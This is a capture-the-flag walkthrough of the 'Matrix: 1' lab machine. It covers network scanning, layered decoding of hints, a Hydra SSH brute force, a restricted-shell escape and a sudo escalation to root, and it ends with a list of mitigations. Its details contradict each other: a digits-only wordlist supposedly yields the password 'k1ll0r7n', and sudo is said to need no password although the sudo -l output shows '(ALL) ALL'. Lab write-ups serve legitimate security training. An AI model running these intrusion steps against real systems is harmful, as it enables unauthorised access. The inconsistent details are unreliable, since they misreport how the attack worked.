# Matrix: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | Matrix: 1 |
| Series | Matrix |
| Author | Ajay Verma |
| Release Date | 19 Aug 2018 |
| OS | Linux |

## 🔍 Overview

Matrix: 1 is a Linux machine themed around "The Matrix" involving a multi-stage cryptographic puzzle (Base64 → Brainfuck → Morse Code) to derive a password pattern, wordlist generation and SSH brute-forcing, a restricted shell (`rbash`) escape, and privilege escalation via a passwordless sudo misconfiguration.

**Machine Details**

- Target IP: `192.168.1.15`
- Attacker (Kali) IP: `192.168.1.10`

---

## Step 1 – Network Discovery

```bash
arp-scan -l | grep -i "Oracle\|PCS"
```

**Found IP:** `192.168.1.15`

---

## Step 2 – Port Scanning

```bash
nmap -T4 -A -p- 192.168.1.15
```

**Open Ports:**

| Port | Service |
|---|---|
| 22/tcp | SSH — OpenSSH 7.7 |
| 80/tcp | SimpleHTTPServer — Python 2.7.14 |
| 31337/tcp | SimpleHTTPServer — Python 2.7.14 (main entry point) |

---

## Step 3 – Web Enumeration (Port 80)

```bash
curl http://192.168.1.15/
```

**Found:** A "Follow the White Rabbit" hint and an image named `p0rt_31337.png`, pointing toward the service on port 31337.

---

## Step 4 – Exploring Port 31337

```bash
curl http://192.168.1.15:31337/
```

**Found:** A Base64-encoded comment embedded in the HTML source.

---

## Step 5 – Decode Base64

```bash
echo "<base64_string>" | base64 -d
```

**Decoded to:** A shell command writing a Matrix-themed quote into a file named `Cypher.matrix`.

---

## Step 6 – Retrieve Cypher.matrix

```bash
curl http://192.168.1.15:31337/Cypher.matrix
```

**Found:** Brainfuck-encoded code.

---

## Step 7 – Decode Brainfuck

Decoded using an online Brainfuck interpreter (dcode.fr).

**Output:** A string of Morse code.

---

## Step 8 – Decode Morse Code

Decoded using CyberChef's "From Morse Code" recipe.

**Revealed:**

- Username: `guest`
- Password pattern: `k1ll0r` + 2 unknown trailing characters

---

## Step 9 – Generate a Targeted Wordlist

```bash
mp64 k1ll0r ?a ?a > dictionary.txt
```

Or manually:

```bash
for i in {0..9}; do
  for j in {0..9}; do
    echo "k1ll0r$i$j" >> dictionary_new.txt
  done
done
```

**Result:** A 100-entry dictionary covering all two-digit suffixes.

---

## Step 10 – Brute Force SSH with Hydra

```bash
hydra -l guest -P dictionary_new.txt ssh://192.168.1.15 -t 4 -f
```

**Password recovered:** `k1ll0r7n`

---

## Step 11 – SSH Login

```bash
ssh guest@192.168.1.15
```

**Result:** Successfully authenticated as `guest`.

---

## Step 12 – Detect Restricted Shell (rbash)

```bash
echo $SHELL
echo $PATH
```

**Result:** Shell was `/bin/rbash` with `PATH` restricted to `/home/guest/prog` — a restricted shell environment.

---

## Step 13 – Escape the Restricted Shell

```bash
export SHELL=/bin/bash
export PATH=/usr/bin:/bin:/sbin:$PATH
bash
```

**Result:** Full, unrestricted bash shell obtained.

---

## Step 14 – Check Sudo Permissions

```bash
sudo -l
```

**Result:**

```
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

---

## Step 15 – Privilege Escalation to Root

```bash
sudo su
```

No password required — sudo was configured to allow this without authentication.

**Result:** Root shell obtained.

---

## Step 16 – Flag Capture

```bash
cd /root
cat flag.txt
```

✅ **Root flag captured — machine fully compromised** (flag delivered as Matrix-themed ASCII art).

---

## 🛡️ Key Vulnerabilities Identified

1. Information disclosure via hints embedded in HTML comments and images
2. Weak, easily-reversible encoding layers used as "obfuscation" (Base64, Brainfuck, Morse code) instead of real protection
3. Weak, predictable password pattern
4. Restricted shell (`rbash`) easily bypassed via `PATH`/`SHELL` environment variable export
5. Passwordless sudo access granting direct root escalation

## Exploitation Chain

```
Port 80 hint → Port 31337 → Base64 → Brainfuck → Morse Code →
Username + password pattern → Wordlist generation → Hydra brute force →
SSH access → rbash escape → sudo su → Root shell → Flag
```

## 🩹 Mitigations

1. Remove sensitive hints or clues from publicly accessible web pages
2. Use proper cryptographic protection — not Base64, Brainfuck, or Morse code, which are trivially reversible
3. Enforce strong, unpredictable password policies
4. Properly harden restricted shells so environment variables cannot be used to escape them
5. Remove passwordless sudo access; require authentication for privileged commands
6. Prefer SSH key-based authentication over passwords

---

## 🧰 Tools Used

`arp-scan` · `nmap` · `curl` · `CyberChef` · `dcode.fr Brainfuck interpreter` · `mp64` · `hydra` · `ssh`

## 🧠 Techniques Covered

Network discovery · Web enumeration · Multi-layer decoding (Base64, Brainfuck, Morse) · Wordlist generation · SSH brute-forcing · Restricted shell escape · Sudo misconfiguration exploitation · Privilege escalation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Discovery | ✅ |
| 2 | Port Scanning | ✅ |
| 3 | Web Enumeration (Port 80) | ✅ |
| 4 | Exploring Port 31337 | ✅ |
| 5 | Decode Base64 | ✅ |
| 6 | Retrieve Cypher.matrix | ✅ |
| 7 | Decode Brainfuck | ✅ |
| 8 | Decode Morse Code | ✅ |
| 9 | Generate Targeted Wordlist | ✅ |
| 10 | Brute Force SSH with Hydra | ✅ |
| 11 | SSH Login | ✅ |
| 12 | Detect Restricted Shell | ✅ |
| 13 | Escape Restricted Shell | ✅ |
| 14 | Check Sudo Permissions | ✅ |
| 15 | Privilege Escalation to Root | ✅ |
| 16 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "Matrix" series.*
